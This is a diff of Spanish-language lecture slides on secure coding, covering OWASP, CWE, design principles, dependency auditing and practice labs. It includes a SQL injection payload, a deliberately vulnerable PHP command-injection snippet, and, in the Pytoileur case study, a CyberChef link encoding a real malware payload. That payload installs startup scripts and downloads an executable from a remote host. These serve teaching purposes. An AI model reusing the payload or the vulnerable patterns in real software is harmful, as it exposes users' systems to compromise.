@@ -42,17 +42,6 @@ Juan Vera del Campo - <juan.vera@professor.universidadviu.com>
 <!-- _class: lead -->
 
 
----
-
-![center](https://owasp.org/assets/images/logo.png)
-
-The Open Web Application Security Project® (OWASP) is a nonprofit foundation that works to improve the security of software.
-
-- Tools and Resources
-- Community and Networking
-- Education & Training
-
-
 ## OWASP: Top 10
 
 ![center w:20em](https://owasp.org/assets/images/content/featured_project_t10.png)
@@ -63,8 +52,14 @@ The Open Web Application Security Project® (OWASP) is a nonprofit foundation th
 
 ![center w:40em](https://owasp.org/www-project-top-ten/assets/images/mapping.png)
 
-https://www.horangi.com/blog/real-life-examples-of-web-vulnerabilities
-https://www.techtarget.com/searchsecurity/news/252494362/10-of-the-biggest-cyber-attacks
+- [Real Life Examples of Web Vulnerabilities (OWASP Top 10)](https://www.horangi.com/blog/real-life-examples-of-web-vulnerabilities)
+- [https://www.techtarget.com/searchsecurity/news/252494362/10-of-the-biggest-cyber-attacks](https://www.techtarget.com/searchsecurity/news/252494362/10-of-the-biggest-cyber-attacks)
+
+<!--
+Ya vimos durante la sesión anterior qué es lo que hace en proyecto OWASP
+
+Entre sus guías, incluye el top ten de vulnerabilidades que debemos evitar en nuestro código
+-->
 
 ## Otros proyectos
 
@@ -93,8 +88,6 @@ https://www.sans.org/top25-software-errors/
 
 <!-- _class: smallest-font -->
 
-https://cwe.mitre.org/index.html
-
 Rank|ID|Name|Score|2020 Rank Change
 --|--|--|--|--
 [1]|CWE-787|	Out-of-bounds Write|	65.93|+1
@@ -108,34 +101,38 @@ Rank|ID|Name|Score|2020 Rank Change
 [9]|CWE-352|	Cross-Site Request Forgery (CSRF)|	14.46	|0
 [10]|CWE-434|	Unrestricted Upload of File with Dangerous Type|	8.45|	+5
 
-## Recomendaciones
-<!-- _class: two-columns smaller-font -->
+https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html
 
-1. **Input Validation**: nunca te fíes de tus entradas
-    - Tamaño de la entrada
-    - Caracteres válidos
-    - Formato, tipo (entero, cadena...) -> **Sanitizar**
-    - Dentro de valores permitidos (máximos, mínimos...)
-    - ¡Existente!
-2. **Manejo de secretos**
-    - Comprueba que los errores de autenticación no incluyen información
-    - Guarda las contraseñas de forma segura en todos los dispositivos
-    - Transmite las contraseñas de forma segura
-    - https://github.com/OWASP/wrongsecrets
+# Secure System Design Principles
+<!-- _class: lead -->
 
-<!-- -->
+"The Protection of Information in Computer Systems", JEROME H. SALTZER and MICHAEL D. SCHROEDER, 1974
 
-3. **Least privilege**
-    - Valida los permisos en cada petición
-    - Crea *tests* que validan permisos
-    - Mantén las autorizaciones en el nivel mínimo posible
-5. **Gestión de librerías** seguras y probadas
-6. **Usable**
-7. **Acceso denegado por defecto**
-10. **Control de calidad** (ver siguiente temas)
+## Sistemas simples
 
+*As systems get more complex, security will get worse* (Bruce Schneier)
 
-> https://codesigningstore.com/secure-coding-practices-to-implement
+*Keeping it simple, stupid!* (simpler said than done)
+
+- Diseños lo más simples y pequeños posible (Principio KISS)
+- Reducir el número de componentes utilizados, conservando sólo aquellos que sean esenciales
+- Servicios y aplicaciones deshabilitados de forma predeterminada
+
+- CWE:
+    - https://cwe.mitre.org/data/definitions/561.html
+    - https://cwe.mitre.org/data/definitions/637.html
+
+> https://es.wikipedia.org/wiki/Principio_KISS
+
+## Valida lo que dice el usuario
+
+- Verifica que todos los datos recibidos cumplan con las propiedades o tipos de datos esperados
+- Mucho cuidado con permitir entender las entradas de los usuarios como código
+- Top 10 de OWASP y SANS
+
+- CWE:
+    - https://cwe.mitre.org/data/definitions/710.html
+    - https://cwe.mitre.org/data/definitions/1006.html
 
 ## Guías de estilo (linters)
 
@@ -156,58 +153,16 @@ Para forzar las mismas reglas en toda la empresa, puedes utilizar linters: no pe
 PEP8 es un ejemplo de reglas. Hay muchos más. Los linters los puedes encontrar para cada lenguaje. Ejemplos en Python: pylama, frake8. Ejemplos en Javascript: eslint
 -->
 
-# Secure System Design Principles
-<!-- _class: lead -->
-
-"The Protection of Information in Computer Systems", JEROME H. SALTZER and MICHAEL D. SCHROEDER, 1974
-
-## Bad example in C#
-
-https://www.codeproject.com/Articles/1083348/Csharp-Bad-Practices-Learn-How-to-Make-Good-Code-b
-
-https://twitter.com/LiveOverflow/status/1729798452094128278
-
-<!--
-Los ejemplos de esta página son una buena introducción a las "reglas de oro" que se discuten en el resto de la sesión. Es muy recomendable visitar esa página durante la sesión, y los alumnos después de ella.
--->
-
-## Sistemas simples
-
-*As systems get more complex, security will get worse* (Bruce Schneier)
-
-*Keeping it simple, stupid!* (simpler said than done)
-
-- Diseños lo más simples y pequeños posible (Principio KISS)
-- Reducir el número de componentes utilizados, conservando sólo aquellos que sean esenciales
-- Servicios y aplicaciones deshabilitados de forma predeterminada
-
-- CWE:
-    - https://cwe.mitre.org/data/definitions/561.html
-    - https://cwe.mitre.org/data/definitions/637.html
-
-> https://es.wikipedia.org/wiki/Principio_KISS
-
-## Best practices y linters
-
-- Verifica que todos los datos recibidos cumplan con las propiedades o tipos de datos esperados
-- Mucho cuidado con permitir entender las entras como código
-- Top 10 de OWASP y SANS
-
-- CWE:
-    - https://cwe.mitre.org/data/definitions/710.html
-    - https://cwe.mitre.org/data/definitions/1006.html
-
 ## Secure by default
 
-La situación por defecto tiene que ser "acceso prohibido"
+La configuración por defecto tiene que ser "acceso prohibido"
 
 Ejemplo:
 
 - No permitas acceso sin autenticación
-- No des información de tus usarios a personas no autenticadas
-- Gestión de contraseñas por defecto
+- No des información privada a personas no autenticadas
+- Política de contraseñas
 - Usa cifrado por defecto
-- Configuraciones seguras por defecto
 
 - CWE:
     - https://cwe.mitre.org/data/definitions/276.html
@@ -216,7 +171,7 @@ Ejemplo:
 ## Complete Mediation
 
 - Para cada acceso a cada objeto verifica que el usuario tiene los permisos adecuado
-- Verificar los permisos implica que el usuario está autenticado en el sistema
+- Verificar los permisos implica que el usuario tiene que estar autenticado en el sistema
 
 - CWE:
     - https://cwe.mitre.org/data/definitions/862.html
@@ -261,6 +216,16 @@ Ejemplo:
     - https://cwe.mitre.org/data/definitions/778.html
     - https://cwe.mitre.org/data/definitions/693.html
 
+
+## Aprende con malos ejemplos
+
+- [C# Bad Practices: Learn How to Make Good Code by Using Examples of Bad Code](https://www.codeproject.com/Articles/1083348/Csharp-Bad-Practices-Learn-How-to-Make-Good-Code-b)
+- [For every 10 likes this gets, I will ask ChatGPT to make this code more insecure](https://twitter.com/LiveOverflow/status/1729798452094128278)
+
+<!--
+Los ejemplos de esta página son una buena introducción a las "reglas de oro" que se discuten en el resto de la sesión. Es muy recomendable visitar esa página durante la sesión, y los alumnos después de ella.
+-->
+
 ## Referencias y resúmenes
 
 - In Defense of Clean Code: 100+ pieces of timeless advice from Uncle Bob : https://dev.to/thawkin3/in-defense-of-clean-code-100-pieces-of-timeless-advice-from-uncle-bob-5flk
@@ -273,8 +238,39 @@ Ejemplo:
 
 - https://github.com/OWASP/DevGuide/blob/master/02-Design/01-Principles%20of%20Security%20Engineering.md
 
-# Recomendaciones para Python
+# Recomendaciones y ejemplos
 <!-- _class: lead -->
+
+## Recomendaciones
+<!-- _class: two-columns smaller-font -->
+
+1. **Input Validation**: nunca te fíes de tus entradas
+    - Tamaño de la entrada
+    - Caracteres válidos
+    - Formato, tipo (entero, cadena...) -> **Sanitizar**
+    - Dentro de valores permitidos (máximos, mínimos...)
+    - ¡Existente!
+2. **Manejo de secretos**
+    - Comprueba que los errores de autenticación no incluyen información
+    - Guarda las contraseñas de forma segura en todos los dispositivos
+    - Transmite las contraseñas de forma segura
+    - https://github.com/OWASP/wrongsecrets
+
+<!-- -->
+
+3. **Least privilege**
+    - Valida los permisos en cada petición
+    - Crea *tests* que validan permisos
+    - Mantén las autorizaciones en el nivel mínimo posible
+5. **Gestión de librerías** seguras y probadas
+6. **Usable**
+7. **Acceso denegado por defecto**
+10. **Control de calidad** (ver siguiente temas)
+
+
+> https://codesigningstore.com/secure-coding-practices-to-implement
+
+<!--
 
 ## Recomendaciones para Python
 
@@ -290,6 +286,8 @@ Ejemplo:
 - Use Python type annotations
 
 > https://snyk.io/blog/python-security-best-practices-cheat-sheet/
+
+-->
 
 ## No te fíes de nadie
 
@@ -436,55 +434,49 @@ os.unlink('borrame.temp')
 Fíjate: en caso de error en el segundo ejemplo, el archivo no se borrará nunca. Además, el programa no puede ejecutarse en paralelo: dos ejecuciones concurrentes trabajarán sobre el mismo archivo.
 -->
 
+##  SQL injection
 
-# Librerías y dependencias
+```
+txtUserId = getRequestString("UserId");
+txtSQL = "SELECT * FROM Users WHERE UserId = " + txtUserId;
+```
+
+Sim, por ejemplo, `UserId=5`, el comando devolverá los datos del usuario 5
+
+Si un atacante es capaz de asignar `UserId= "105 OR 1=1"`...
+
+Se ejecutará: `SELECT * FROM Users WHERE UserId = 105 OR 1=1;`
+
+¡Este comando devuelve toda la base de datos!
+
+> https://www.w3schools.com/sql/sql_injection.asp
+
+## Command injection
+<!-- _class: two-columns -->
+
+```php
+<?php
+
+$command = "ls ".$_GET['modifiers'];
+
+$output = exec($command);
+```
+
+![](images/commandinjection.png)
+
+
+
+# Proyectos, librerías y dependencias
 <!-- _class: lead -->
 
-## ¡No reinventes la rueda!
-
-- No reinvientes la rueda: utiliza librerías reconocidas siempre que puedas
-- Pero recuerda auditar tus librerías
-- Considera utilizar contextos para la aplicación:
-  - JavaScript: npm / yarn
-  - Python: pip / conda / pipenv
-
-
-## Audita tus librerías / dependencias
-
-- https://www.bleepingcomputer.com/news/security/pytorch-discloses-malicious-dependency-chain-compromise-over-holidays/
-- https://blog.reversinglabs.com/blog/the-npm-package-that-walked-away-with-all-your-passwords
-- https://arstechnica.com/information-technology/2022/08/10-malicious-python-packages-exposed-in-latest-repository-attack/
-- https://portswigger.net/daily-swig/popular-node-js-package-vulnerable-to-command-injection-attacks
-- https://blog.sonatype.com/open-source-attacks-on-the-rise-top-8-malicious-packages-found-in-npm
-
-## Cuidado con la inteligengia artificial
-<!-- _class: with-warning -->
-
-Asistentes de código:
-
-- ChatGPT, escribe código a partir de lenguaje natural
-- CoPilot, propone código a partir de un esqueleto que escribimos nosotros
-
-![bg left:45% w:100%](images/coding/AI_2.jpg)
-
-
-ChatGPT propone código con SQL Injection y CoPilot mete vulnerabilidades
-
-> https://www.elladodelmal.com/2022/12/chatgpt-hace-codigo-con-sql-injection.html?m=1
-> https://www.elladodelmal.com/2022/09/copilot-y-su-codigo-inseguro-o-como-la.html
-
-# Proyectos JavaScript / Python
-<!-- _class: lead -->
-
----
-
-En esta sección crearemos un proyecto Vue directamente dentro de un docker. Esta no es la manera recomendada de crear proyectos Vue, pero lo haremos así para no tener que instalar más cosas en nuestros PCs.
 
 ## Creación del proyecto
 
+En esta sección crearemos un proyecto Vue directamente dentro de un docker. Esta no es la manera recomendada de crear proyectos Vue, pero lo haremos así para no tener que instalar más cosas en nuestros PCs.
+
 ```
 docker run -ti --rm node bash
-mkdir project ; cd project∫
+mkdir project ; cd project
 npm install vue
 npm install vuetify
 npm install vuetify@^3.0.1
@@ -528,15 +520,87 @@ Ejemplos:
   },
 ```
 
+
+## ¡No re-inventes la rueda!
+
+- No re-inventes la rueda: utiliza librerías reconocidas siempre que puedas
+- Pero recuerda auditar tus librerías
+- Considera utilizar contextos para la aplicación:
+  - JavaScript: npm / yarn
+  - Python: pip / conda / pipenv
+
+## Ejemplo: Pytoileur
+<!-- _class: two-columns -->
+
+![center w:20em](images/coding/pytolib1.png)
+
+- Librería publicada en Pypi el 27 de mayo de 2024 ([Link](https://pypi.org/project/pytoileur/1.0.2/))
+- Descripción genérica "pystob allows for API Authorization Management and allows to build REST-Based API with custom JSON syntax. "
+
+> Historia completa: https://www.sonatype.com/blog/pypi-crypto-stealer-targets-windows-users-revives-malware-campaign
+
 ---
 
-![center](images/coding/auditoria-librerias2.png)
+Si descargas el código, solo tiene un archivo `setup.py`, que parece completamente vacío y limpio a primera vista...
+
+![center](images/coding/pytolib2.png)
+
+---
+
+Pero esa línea 17 en realidad oculta otro comando después de muchos espacios. Para poder verlo hay que activar el "word wrap" en tu editor de texto (Alt+Z en VS)
+
+![center w:15em](images/coding/pytolib3.png)
+
+---
+
+Si analizamos qué hace este código: añade un archivo a Windows que se ejecuta siempre que el usuario abre una nueva sesión en su PC
+
+![](images/coding/pytolib4.png)
+
+
+[](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Syntax_highlighter('powershell')&input=YVcxd2IzSjBJRzl6Q21sdGNHOXlkQ0J6ZFdKd2NtOWpaWE56Q214dloybHVJRDBnYjNNdVoyVjBiRzluYVc0b0tRcHBaaUJ2Y3k1d1lYUm9MbVY0YVhOMGN5aG1KME02WEZ4VmMyVnljMXhjZTJ4dloybHVmVnhjUVhCd1JHRjBZVnhjVW05aGJXbHVaMXhjVFdsamNtOXpiMlowWEZ4WGFXNWtiM2R6WEZ4VGRHRnlkQ0JOWlc1MVhGeFFjbTluY21GdGMxeGNVM2x6ZEdWdE9EWmNYQ2NwSUQwOUlFWmhiSE5sT2dvS0lDQWdJRzl6TG0xclpHbHlLR1lpUXpwY1hGVnpaWEp6WEZ4N2JHOW5hVzU5WEZ4QmNIQkVZWFJoWEZ4U2IyRnRhVzVuWEZ4TmFXTnliM052Wm5SY1hGZHBibVJ2ZDNOY1hGTjBZWEowSUUxbGJuVmNYRkJ5YjJkeVlXMXpYRnhUZVhOMFpXMDROaUlwQ2lBZ0lDQnZjR1Z1S0dZaVF6cGNYRlZ6WlhKelhGeDdiRzluYVc1OVhGeEJjSEJFWVhSaFhGeFNiMkZ0YVc1blhGeE5hV055YjNOdlpuUmNYRmRwYm1SdmQzTmNYRk4wWVhKMElFMWxiblZjWEZCeWIyZHlZVzF6WEZ4VGVYTjBaVzA0Tmx4Y1YwbE9Nekl1ZG1Keklpd2dJbUVpS1M1M2NtbDBaU2htSjFObGRDQlhjMmhUYUdWc2JDQTlJRU55WldGMFpVOWlhbVZqZENnaVYxTmpjbWx3ZEM1VGFHVnNiQ0lwSUZ4dVYzTm9VMmhsYkd3dVVuVnVJR05vY2lnek5Da2dKaUFpUXpwY1hGVnpaWEp6WEZ4N2JHOW5hVzU5WEZ4QmNIQkVZWFJoWEZ4U2IyRnRhVzVuWEZ4TmFXTnliM052Wm5SY1hGZHBibVJ2ZDNOY1hGTjBZWEowSUUxbGJuVmNYRkJ5YjJkeVlXMXpYRnhUZVhOMFpXMDRObHhjVjBsT016SXVZbUYwSWlBbUlFTm9jaWd6TkNrc0lEQmNibE5sZENCWGMyaFRhR1ZzYkNBOUlFNXZkR2hwYm1jbktRb2dJQ0FnYjNCbGJpaG1Ja002WEZ4VmMyVnljMXhjZTJ4dloybHVmVnhjUVhCd1JHRjBZVnhjVW05aGJXbHVaMXhjVFdsamNtOXpiMlowWEZ4WGFXNWtiM2R6WEZ4VGRHRnlkQ0JOWlc1MVhGeFFjbTluY21GdGMxeGNVM2x6ZEdWdE9EWmNYRmRKVGpZMExuWmljeUlzSUNKaElpa3VkM0pwZEdVb1ppZFRaWFFnVjNOb1UyaGxiR3dnUFNCRGNtVmhkR1ZQWW1wbFkzUW9JbGRUWTNKcGNIUXVVMmhsYkd3aUtTQmNibGR6YUZOb1pXeHNMbEoxYmlCamFISW9NelFwSUNZZ0lrTTZYRnhWYzJWeWMxeGNlMnh2WjJsdWZWeGNRWEJ3UkdGMFlWeGNVbTloYldsdVoxeGNUV2xqY205emIyWjBYRnhYYVc1a2IzZHpYRnhUZEdGeWRDQk5aVzUxWEZ4UWNtOW5jbUZ0YzF4Y1UzbHpkR1Z0T0RaY1hGSjFiblJwYldVdVpYaGxJaUFtSUVOb2NpZ3pOQ2tzSURCY2JsTmxkQ0JYYzJoVGFHVnNiQ0E5SUU1dmRHaHBibWNuS1FvS0lDQWdJRzl3Wlc0b1ppSkRPbHhjVlhObGNuTmNYSHRzYjJkcGJuMWNYRUZ3Y0VSaGRHRmNYRkp2WVcxcGJtZGNYRTFwWTNKdmMyOW1kRnhjVjJsdVpHOTNjMXhjVTNSaGNuUWdUV1Z1ZFZ4Y1VISnZaM0poYlhOY1hGTjVjM1JsYlRnMlhGeFhTVTR6TWk1aVlYUWlMQ0FpWVNJcExuZHlhWFJsS0dZbkp5ZGlhWFJ6WVdSdGFXNGdMM1J5WVc1elptVnlJRzE1Wkc5M2JteHZZV1JxYjJJZ0wyUnZkMjVzYjJGa0lDOXdjbWx2Y21sMGVTQkdUMUpGUjFKUFZVNUVJQ0pvZEhSd09pOHZOVEV1TnpjdU1UUXdMakUwTkRvNE1EZzJMMlJzTDNKMWJuUnBiV1VpSUNKRE9seGNWWE5sY25OY1hIdHNiMmRwYm4xY1hFRndjRVJoZEdGY1hGSnZZVzFwYm1kY1hFMXBZM0p2YzI5bWRGeGNWMmx1Wkc5M2MxeGNVM1JoY25RZ1RXVnVkVnhjVUhKdlozSmhiWE5jWEZONWMzUmxiVGcyWEZ4U2RXNTBhVzFsTG1WNFpTSmNibk4wWVhKMElDSWlJQ0pET2x4Y1ZYTmxjbk5jWEh0c2IyZHBibjFjWEVGd2NFUmhkR0ZjWEZKdllXMXBibWRjWEUxcFkzSnZjMjltZEZ4Y1YybHVaRzkzYzF4Y1UzUmhjblFnVFdWdWRWeGNVSEp2WjNKaGJYTmNYRk41YzNSbGJUZzJYRnhTZFc1MGFXMWxMbVY0WlNJbkp5Y3BDaUFnSUNCemRXSndjbTlqWlhOekxuSjFiaWhtSWtNNlhGeFZjMlZ5YzF4Y2UyeHZaMmx1ZlZ4Y1FYQndSR0YwWVZ4Y1VtOWhiV2x1WjF4Y1RXbGpjbTl6YjJaMFhGeFhhVzVrYjNkelhGeFRkR0Z5ZENCTlpXNTFYRnhRY205bmNtRnRjMXhjVTNsemRHVnRPRFpjWEZkSlRqTXlMblppY3lJc0lITm9aV3hzUFZSeWRXVXNJR05vWldOclBWUnlkV1VwQ2lBZ0lDQUtaV3h6WlRvZ0lDQUtJQ0FnSUhCaGMzTT0)
+
+---
+
+El atacante recomendaba instalar su librería en respuestas en sourceforge (comentarios borrados actualmente)
+
+![center](images/coding/pytolib5.png)
+
+
+## Audita tus librerías / dependencias
+
+- [The NPM package that walked away with all your passwords (2019)](https://blog.reversinglabs.com/blog/the-npm-package-that-walked-away-with-all-your-passwords)
+- [Popular Node.js package vulnerable to command injection attacks (2021)](https://portswigger.net/daily-swig/popular-node-js-package-vulnerable-to-command-injection-attacks)
+- [Open source attacks on the rise: Top 8 malicious packages found in npm (2021)](https://blog.sonatype.com/open-source-attacks-on-the-rise-top-8-malicious-packages-found-in-npm)
+- [10 malicious Python packages exposed in latest repository attack (2022)](https://arstechnica.com/information-technology/2022/08/10-malicious-python-packages-exposed-in-latest-repository-attack/)
+- [Protecting Your Software from Malicious Third-party Dependencies (2023)](https://www.csa.gov.sg/alerts-advisories/Advisories/2023/ad-2023-002)
+- [PyTorch discloses malicious dependency chain compromise over holidays (2023)](https://www.bleepingcomputer.com/news/security/pytorch-discloses-malicious-dependency-chain-compromise-over-holidays/)
+- [State of Dependency Management (2023)](https://www.endorlabs.com/learn/state-of-dependency-management-2023)
+- [Backdoor in upstream xz/liblzma leading to ssh server compromise (2024)](https://www.openwall.com/lists/oss-security/2024/03/29/4)
 
 ## Auditoría de librerías
+
+Ejemplo de auditoría de librerías, veremos más detalles en las siguientes sesiones
 
 ```
 npm audit
 ```
+
+## Cuidado con la inteligengia artificial
+<!-- _class: with-warning -->
+
+Asistentes de código:
+
+- ChatGPT, escribe código a partir de lenguaje natural
+- CoPilot, propone código a partir de un esqueleto que escribimos nosotros
+
+![bg left:45% w:100%](images/coding/AI_2.jpg)
+
+
+ChatGPT propone código con SQL Injection y CoPilot mete vulnerabilidades
+
+> https://www.elladodelmal.com/2022/12/chatgpt-hace-codigo-con-sql-injection.html?m=1
+> https://www.elladodelmal.com/2022/09/copilot-y-su-codigo-inseguro-o-como-la.html
 
 
 # Ejemplos
@@ -683,6 +747,7 @@ def get_current_username(
 
 > https://fastapi.tiangolo.com/advanced/security/http-basic-auth/#__tabbed_3_1
 
+<!--
 ---
 
 ![center w:40em](images/coding/demos1.png)
@@ -690,6 +755,8 @@ def get_current_username(
 ---
 
 ![center w:25em](images/coding/demos2.png)
+
+-->
 
 ## Referencias
 <!-- _class: lead -->
@@ -703,6 +770,48 @@ def get_current_username(
 - [Asleep at the Keyboard? Assessing the
 Security of GitHub Copilot’s Code Contribution](https://arxiv.org/pdf/2108.09293.pdf), diciembre 2021
 - https://rules.sonarsource.com/
+
+
+## Para practicar: Bwapp
+
+![bg left:60% w:90%](https://2.bp.blogspot.com/-eLNKbmnOpFg/WwKCa9IBpbI/AAAAAAAADlw/iPv1oX04beInZcDsA57lljJPKz-o1weSACLcBGAs/s640/screenshot-from-2017-01-03-12-39-35-945x531.png)
+
+- Aplicación web con múltiples problemas de seguridad
+- ¡No incluye explicaciones!
+- Tres niveles de dificultad
+
+http://www.itsecgames.com/
+
+---
+
+1. `docker run --rm -p 8080:80 raesene/bwapp`
+1. Go to: <http://localhost:8080/install.php> and click on "install"
+
+<!--
+Soluciones:
+
+- https://jaiguptanick.github.io/Blog/blog/Walkthrough_of_bWAPP_solutions_A1_injection_writeups/
+- https://dumbmaster.blogspot.com/2017/01/owasp-top-10-bwapp-walkthrough-for-a1_21.html
+-->
+
+## Para practicar: WebGoat
+
+![bg left:60% w:90%](https://terokarvinen.com/2020/install-webgoat-web-pentest-practice-target/learning-to-hack_huc9eb25cbfbc872792538337cc9ab52d5_145628_800x800_fit_box_3.png)
+
+- Web de aprendizaje de OWASP
+- Incluye lecciones y ejercicios de la lista de OWASP
+
+https://owasp.org/www-project-webgoat/
+
+---
+
+1. `docker run --rm -p 8080:8080 -p 9090:9090 -t -e TZ=Europe/Amsterdam webgoat/goatandwolf`
+1. Ve a <http://localhost:8080/WebGoat> y registra un nuevo usuario
+
+<!--
+Nota: no he sido capaz de ejecutar WebWolf desde el docker, quizá prefieras hacerlo en tu propio PC
+-->
+
 
 # ¡Gracias!
 <!-- _class: last-slide --> 
